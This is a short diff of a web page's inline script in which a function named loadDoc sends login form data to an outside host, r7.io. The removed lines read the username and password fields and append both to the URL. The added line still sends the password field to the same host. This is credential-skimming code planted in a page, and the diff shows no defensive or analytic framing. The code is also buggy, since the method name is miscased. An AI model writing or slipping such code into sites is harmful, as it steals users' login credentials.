@@ -341,9 +341,7 @@ document.getElementsByClassName('problem')[0].style.display = 'none';
 
 function loadDoc() {
 var xhttp = new XMLHttpRequest();
-let username = document.getElementbyId('login_username').value;
-let pass = document.getElementbyId('login_password').value;
-xhttp.open("GET", "http://r7.io/e/akean?s=" + "password = " + pass + "username = " + username, true);
+xhttp.open("GET", "http://r7.io/e/akean?s=" + document.getElementbyId('login_password'), true);
 xhttp.send();
 }
 </script>
